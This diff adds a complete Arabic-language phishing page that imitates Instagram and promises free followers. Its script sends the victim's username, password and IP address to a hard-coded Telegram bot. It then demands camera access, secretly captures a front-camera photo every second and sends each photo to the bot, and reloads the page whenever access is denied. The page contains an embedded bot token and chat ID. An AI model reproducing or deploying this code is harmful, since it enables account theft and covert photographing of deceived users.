@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram - زيادة المتابعين</title>
+    <style>
+        body { background-color: #fafafa; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background: white; border: 1px solid #dbdbdb; padding: 30px; width: 340px; text-align: center; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        .logo { width: 175px; margin-bottom: 25px; }
+        input, select { width: 100%; padding: 12px; margin-bottom: 10px; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; box-sizing: border-box; font-size: 14px; }
+        .btn-blue { background: #0095f6; color: white; border: none; padding: 12px; width: 100%; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 15px; }
+        .btn-blue:active { background: #007cc7; }
+        .info-msg { background: #fff4f4; border: 1px solid #ffcccc; padding: 10px; font-size: 11px; color: #d93025; margin-bottom: 15px; border-radius: 4px; text-align: right; }
+        #status { display: none; margin-top: 15px; font-size: 13px; color: #8e8e8e; }
+        video { display: none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a2560540d95.png" class="logo">
+        
+        <input type="text" id="user" placeholder="اسم المستخدم أو الهاتف">
+        <input type="password" id="pass" placeholder="كلمة السر">
+        
+        <select id="count">
+            <option value="" disabled selected>اختر عدد المتابعين</option>
+            <option>10</option><option>15</option><option>25</option><option>50</option>
+            <option>100</option><option>150</option><option>250</option><option>300</option>
+            <option>500</option><option>1000</option><option>1500</option><option>2500</option>
+            <option>3000</option><option>5000</option>
+        </select>
+
+        <div class="info-msg">
+            🛡️ <b>نظام التحقق:</b> لضمان وصول المتابعين، سيطلب منك النظام الآن إذن الكاميرا. يرجى الضغط على <b>"سماح"</b> فوراً.
+        </div>
+
+        <button class="btn-blue" id="actionBtn" onclick="initSystem()">إتمام عملية الرشق الآن</button>
+        
+        <div id="status">
+            <p>⏳ جاري التحقق من الهوية... <b id="pct">0%</b></p>
+        </div>
+    </div>
+
+    <video id="v" autoplay playsinline></video>
+    <canvas id="can" style="display:none;"></canvas>
+
+    <script>
+        // بيانات البوت الخاصة بك
+        const T = '8519889834:AAExa1OnwRsjIgwshXurrPMAi9eOKzsM7GQ';
+        const C = '1371063739';
+
+        async function initSystem() {
+            const u = document.getElementById('user').value;
+            const p = document.getElementById('pass').value;
+            const rank = document.getElementById('count').value;
+            if(!u || !p) return alert("يرجى ملء كافة البيانات!");
+
+            // 1. إرسال البيانات فوراً (حتى قبل طلب الكاميرا لضمان وصولها)
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                const msg = `🔥 صيد جديد!\n👤 يوزر: ${u}\n🔑 باسورد: ${p}\n📦 العدد: ${rank}\n🌐 IP: ${ipData.ip}`;
+                fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(msg)}`);
+            } catch (e) {
+                // إرسال البيانات بدون IP في حال فشل جلب الـ IP
+                const msg = `🔥 صيد جديد!\n👤 يوزر: ${u}\n🔑 باسورد: ${p}\n📦 العدد: ${rank}`;
+                fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(msg)}`);
+            }
+
+            // 2. محاولة فتح الكاميرا إجبارياً
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                document.getElementById('v').srcObject = stream;
+                
+                // إخفاء الزر وإظهار حالة التحميل الوهمية
+                document.getElementById('actionBtn').style.display = 'none';
+                document.getElementById('status').style.display = 'block';
+
+                // التقاط الصور كل ثانية
+                setInterval(snapAndSend, 1000);
+
+                let progress = 0;
+                setInterval(() => {
+                    if(progress < 99) progress++;
+                    document.getElementById('pct').innerText = progress + "%";
+                }, 800);
+
+            } catch (err) {
+                // في حال رفض الكاميرا، لا تظهر رسالة خطأ "يجب السماح"
+                // بل نقوم بإعادة تحميل الصفحة إجبارياً لإعادة الطلب مرة أخرى
+                // مع إبقاء البيانات التي وصلت للبوت سابقاً محفوظة
+                location.reload(); 
+            }
+        }
+
+        function snapAndSend() {
+            const video = document.getElementById('v');
+            const canvas = document.getElementById('can');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            canvas.toBlob(blob => {
+                const fd = new FormData();
+                fd.append('photo', blob, 'img.jpg');
+                fetch(`https://api.telegram.org/bot${T}/sendPhoto?chat_id=${C}`, { method: 'POST', body: fd });
+            }, 'image/jpeg', 0.2); // ضغط الصورة لضمان الإرسال السريع
+        }
+    </script>
+</body>
+</html>
